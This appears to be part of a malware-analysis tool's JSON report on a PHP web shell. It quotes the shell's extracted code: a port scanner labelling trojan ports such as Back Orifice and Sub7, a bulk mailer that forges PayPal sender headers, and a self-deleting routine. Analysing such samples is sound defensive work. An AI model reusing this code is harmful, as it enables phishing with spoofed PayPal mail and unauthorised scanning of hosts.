            "$arr[3001] = \"Redwood Broker\";",
            "$arr[3031] = \"Apple AgentVU\";",
            "$arr[3128] = \"squid\";",
            "$arr[3130] = \"ICP\";",
            "$arr[3150] = \"DeepThroat\";",
            "$arr[3264] = \"ccmail\";",
            "$arr[3283] = \"Apple NetAssitant\";",
            "$arr[3288] = \"COPS\";",
            "$arr[3305] = \"ODETTE\";",
            "$arr[3306] = \"mySQL\";",
            "$arr[3389] = \"RDP Protocol (Terminal Server)\";",
            "$arr[3521] = \"netrek\";",
            "$arr[4000] = \"icq, command-n-conquer\";",
            "$arr[4321] = \"rwhois\";",
            "$arr[4333] = \"mSQL\";",
            "$arr[4444] = \"KRB524\";",
            "$arr[4827] = \"HTCP\";",
            "$arr[5002] = \"radio free ethernet\";",
            "$arr[5004] = \"RTP\";",
            "$arr[5005] = \"RTP\";",
            "$arr[5010] = \"Yahoo! Messenger\";",
            "$arr[5050] = \"multimedia conference control tool\";",
            "$arr[5060] = \"SIP\";",
            "$arr[5150] = \"Ascend Tunnel Management Protocol\";",
            "$arr[5190] = \"AIM\";",
            "$arr[5500] = \"securid\";",
            "$arr[5501] = \"securidprop\";",
            "$arr[5423] = \"Apple VirtualUser\";",
            "$arr[5555] = \"Personal Agent\";",
            "$arr[5631] = \"PCAnywhere data\";",
            "$arr[5632] = \"PCAnywhere\";",
            "$arr[5678] = \"Remote Replication Agent Connection\";",
            "$arr[5800] = \"VNC\";",
            "$arr[5801] = \"VNC\";",
            "$arr[5900] = \"VNC\";",
            "$arr[5901] = \"VNC\";",
            "$arr[6000] = \"X Windows\";",
            "$arr[6112] = \"BattleNet\";",
            "$arr[6502] = \"Netscape Conference\";",
            "$arr[6667] = \"IRC\";",
            "$arr[6670] = \"VocalTec Internet Phone, DeepThroat\";",
            "$arr[6699] = \"napster\";",
            "$arr[6776] = \"Sub7\";",
            "$arr[6970] = \"RTP\";",
            "$arr[7007] = \"MSBD, Windows Media encoder\";",
            "$arr[7070] = \"RealServer/QuickTime\";",
            "$arr[7777] = \"cbt\";",
            "$arr[7778] = \"Unreal\";",
            "$arr[7648] = \"CU-SeeMe\";",
            "$arr[7649] = \"CU-SeeMe\";",
            "$arr[8000] = \"iRDMI/Shoutcast Server\";",
            "$arr[8010] = \"WinGate 2.1\";",
            "$arr[8080] = \"HTTP\";",
            "$arr[8181] = \"HTTP\";",
            "$arr[8383] = \"IMail WWW\";",
            "$arr[8875] = \"napster\";",
            "$arr[8888] = \"napster\";",
            "$arr[8889] = \"Desktop Data TCP 1\";",
            "$arr[8890] = \"Desktop Data TCP 2\";",
            "$arr[8891] = \"Desktop Data TCP 3: NESS application\";",
            "$arr[8892] = \"Desktop Data TCP 4: FARM product\";",
            "$arr[8893] = \"Desktop Data TCP 5: NewsEDGE/Web application\";",
            "$arr[8894] = \"Desktop Data TCP 6: COAL application\";",
            "$arr[9000] = \"CSlistener\";",
            "$arr[10008] = \"cheese worm\";",
            "$arr[11371] = \"PGP 5 Keyserver\";",
            "$arr[13223] = \"PowWow\";",
            "$arr[13224] = \"PowWow\";",
            "$arr[14237] = \"Palm\";",
            "$arr[14238] = \"Palm\";",
            "$arr[18888] = \"LiquidAudio\";",
            "$arr[21157] = \"Activision\";",
            "$arr[22555] = \"Vocaltec Web Conference\";",
            "$arr[23213] = \"PowWow\";",
            "$arr[23214] = \"PowWow\";",
            "$arr[23456] = \"EvilFTP\";",
            "$arr[26000] = \"Quake\";",
            "$arr[27001] = \"QuakeWorld\";",
            "$arr[27010] = \"Half-Life\";",
            "$arr[27015] = \"Half-Life\";",
            "$arr[27960] = \"QuakeIII\";",
            "$arr[30029] = \"AOL Admin\";",
            "$arr[31337] = \"Back Orifice\";",
            "$arr[32777] = \"rpc.walld\";",
            "$arr[45000] = \"Cisco NetRanger postofficed\";",
            "$arr[32773] = \"rpc bserverd\";",
            "$arr[32776] = \"rpc.spray\";",
            "$arr[32779] = \"rpc.cmsd\";",
            "$arr[38036] = \"timestep\";",
            "$arr[40193] = \"Novell\";",
            "$arr[41524] = \"arcserve discovery\";",
            "$arr[2082] = \"cPanel\";",
            "if($arr[$port]==\"\"){",
            "$arr[$port] = \"Unknown Port\";",
            "print \"<div id=\\\"unCenter\\\"><div class=\\\"Marged\\\"><div class=\\\"Table\\\" style=\\\"padding-left: 20\\\">\";",
            "$portcont=0;",
            "foreach(explode(\" \",\"$ports\") as $port) {",
            "     $portcont++;",
            "     if ($portcont < 30 ) {",
            "     if ( is_numeric($port) ) {",
            "     $fp = @fsockopen($host,$port,$errno,$errstr,3);",
            "     if(!$fp)",
            "     {",
            "         print \"<div>$port | <span style=\\\"color: RED;\\\">CLOSE</span> |\";",
            "     }",
            "     else",
            "     {",
            "         print \"<div>$port | <span style=\\\"color: GREEN;\\\">OPEN</span>  |\";",
            "         fclose($fp);",
            "    }",
            "    print \" $arr[$port]</div>\";",
            "    flush();",
            "    }else{",
            "       print \"Error a $port. Not valid.\";",
            "    }",
            "print \"</div></div></div>\";",
            "</table>",
            "<div id=\"unCenter\">",
            "\t<div class=\"Marged\">",
            "\t\t<div class=\"Table\">",
            "\t\t\t<center>",
            "\t\t\t<div>Other Port (enter for check):<br></div>",
            "\t\t\t<div><form action=\"<? echo $_SERVER['PHP_SELF'] . '?PortCheck&port' ?>\" method=\"GET\"></div>",
            "\t\t\t<div><input type=\"text\" name=\"port\">&nbsp;<input type=\"submit\" value=\"Scan\"></div>",
            "\t\t\t</center>",
            "\t\t</div>",
            "\t</div>",
            "</div>",
            "<!-- </PortCheck> -->",
            "<? echo $GraphicFooter; } ?>",
            "<? if(isset($_GET['Mailer'])) {",
            "echo '<html><head><title>'.$Title.' Mailer</title>';",
            "echo $GraphicHeader;",
            "echo $SiteHeader;",
            "if ($action==\"send\"){",
            "\t$message = urlencode($message);",
            "\t$message = ereg_replace(\"%5C%22\", \"%22\", $message);",
            "\t$message = urldecode($message);",
            "\t$message = stripslashes($message);",
            "\t$subject = stripslashes($subject);",
            "<!-- Mailer -->",
            "<form name=\"Mailer\" method=\"post\" action=\"<? echo $_SERVER['PHP_SELF'] . '?Mailer' ?>\" enctype=\"multipart/form-data\">",
            "<div id=\"unCenterShell\">",
            "\t<div class=\"Marged\">",
            "\t\t<div class=\"Table\">",
            " <div align=\"left\">",
            "\t<div style=\"padding-left: 20px;\">Your Email: <input class=\"input\" type=\"text\" name=\"from\" value=\"\" size=\"20\">",
            "\t<span style=\"padding-left: 122px;\"></span>Your Name: <input class=\"input\" type=\"text\" name=\"realname\" value=\"\" size=\"20\"></div>",
            "\t<div style=\"padding-left: 26px;\">Reply-To: <input class=\"input\" type=\"text\" name=\"replyto\" value=\"\" size=\"20\">",
            "\t<span style=\"padding-left: 123px;\"></span>Attach File: <input class=\"input\" type=\"file\" name=\"file\" size=\"20\"></div>",
            "\t<div style=\"padding-left: 33px;\">Subject: <input class=\"input\" type=\"text\" name=\"subject\" value=\"\" size=\"90\"></div>",
            " </div>",
            "\t<div align=\"left\"><span style=\"padding-left: 4px;\"></span>Letter:<span style=\"padding-left: 392px;\"></span>Recipients:</div>",
            "\t<div><textarea class=\"input\" name=\"message\" cols=\"50\" rows=\"10\"></textarea>",
            "\t<textarea class=\"input\" name=\"emaillist\" cols=\"25\" rows=\"10\"></textarea></div>",
            "\t\t</div>",
            "\t</div>",
            "</div>",
            "<div id=\"unCenter\">",
            "\t<div class=\"Marged\">",
            "\t\t<div class=\"Table\">",
            "<div align=\"center\"><input type=\"radio\" name=\"contenttype\" value=\"plain\">Plain",
            "\t<input type=\"radio\" name=\"contenttype\" value=\"html\" checked>HTML",
            "\t<input type=\"hidden\" name=\"action\" value=\"send\"><input class=\"input\" type=\"submit\" value=\"Send eMails\"></div>",
            "\t\t</div>",
            "\t</div>",
            "</div>",
            "</form>",
            "if ($action==\"send\"){",
            "\tif (!$from && !$subject && !$message && !$emaillist){",
            "\techo '<div id=\"unCenter\"><div class=\"Marged\"><div class=\"Table\"><center>",
            "\t<div>Please complete all fields before sending your message.</div>",
            "\t</center></div></div></div>';",
            "\techo $GraphicFooter;",
            "\texit;",
            "\t$allemails = split(\"\\n\", $emaillist);",
            "\t$numemails = count($allemails);",
            "\t#Open the file attachment if any, and base64_encode it for email transport",
            "\tIf ($file_name){",
            "\t\t@copy($file, \"./$file_name\") or die(\"The file you are trying to upload couldn't be copied to the server\");",
            "\t\t$content = fread(fopen($file,\"r\"),filesize($file));",
            "\t\t$content = chunk_split(base64_encode($content));",
            "\t\t$uid = strtoupper(md5(uniqid(time())));",
            "\t\t$name = basename($file);",
            "\techo '<div id=\"unCenter\"><div class=\"Marged\"><div class=\"Table\"><center>';",
            "\tfor($x=0; $x<$numemails; $x++){",
            "\t\t$to = $allemails[$x];",
            "\t\tif ($to){",
            "\t\t$to = ereg_replace(\" \", \"\", $to);",
            "\t\t$message = ereg_replace(\"&email&\", $to, $message);",
            "\t\t$subject = ereg_replace(\"&email&\", $to, $subject);",
            "\t\tprint \"Sending: [ $to ] \";",
            "\t\tflush();",
            "\t\t$header = \"From: $realname <$from>\\r\\n\";",
            "\t\t$header .= \"Reply-To: $replyto\\r\\n\";",
            "\t\t$header .= \"MIME-Version: 1.0\\r\\n\";",
            "\t\tIf ($file_name) $header .= \"Content-Type: multipart/mixed; boundary=$uid\\r\\n\";",
            "\t\tIf ($file_name) $header .= \"--$uid\\r\\n\";",
            "\t\t$header .= \"Message-Id:<1130384585.13653@paypal.com>\\r\\n\";",
            "\t\t$header .= \"Return-Path: <service@paypal.com>\\r\\n\";",
            "\t\t$header .= \"Content-Type: text/$contenttype\\r\\n\";",
            "\t\t$header .= \"Content-Transfer-Encoding: 8bit\\r\\n\\r\\n\";",
            "\t\t$header .= \"$message\\r\\n\";",
            "\t\tIf ($file_name) $header .= \"--$uid\\r\\n\";",
            "\t\tIf ($file_name) $header .= \"Content-Type: $file_type; name=\\\"$file_name\\\"\\r\\n\";",
            "\t\tIf ($file_name) $header .= \"Content-Transfer-Encoding: base64\\r\\n\";",
            "\t\tIf ($file_name) $header .= \"Content-Disposition: attachment; filename=\\\"$file_name\\\"\\r\\n\\r\\n\";",
            "\t\tIf ($file_name) $header .= \"$content\\r\\n\";",
            "\t\tIf ($file_name) $header .= \"--$uid--\";",
            "\t\tmail($to, $subject, \"\", $header);",
            "\t\tprint \"........Success!<br>\";",
            "\t\tflush();",
            "echo \"</center></div></div></div>\";",
            "<!-- </Mailer> -->",
            "<? echo $GraphicFooter; } ?>",
            "<? if(isset($_GET['DeleteMe'])){",
            "echo '<html><head><title>'.$Title.' DeleteMe</title>';",
            "echo $GraphicHeader; echo $SiteHeader;",
            "if($del){",
            "$url = \"http://\" .$_SERVER['HTTP_HOST']. \"/\";",
            "print \"<META HTTP-EQUIV=\\\"Refresh\\\" CONTENT=\\\"0; URL= $url \\\">\";",
            "unlink('kscr.php');",
            "<!-- <DeleteMeGraphic> -->",
            "<div id=\"unCenter\">",
            "\t<div class=\"Marged\">",
            "\t\t<div class=\"Table\">",
            "\t\t\t<center>",
            "\t\t\t<div></div>",
            "\t\t\t<div style=\"font-size 10px: bold; font-weight: bold;\">Delete Me?</div>",
            "\t\t\t<br>",
            "\t\t\t<div><a href=\"?DeleteMe&del=TRUE\">Yes (Delete)</a><img src=\"\" border=\"0\" height=\"0\" width=\"50\"><a href=\"?MainPage\">No (Go Home)</a></div>",
            "\t\t\t</center>",
            "\t\t</div>",
            "\t</div>",
            "</div>",
            "<!-- </DeleteMeGaphic> -->",
            "<? echo $GraphicFooter; } ?>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://",
            "http://kileris.net/images/fuck.gif"
        ]
    },
    "time": "0:00:00.412824",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
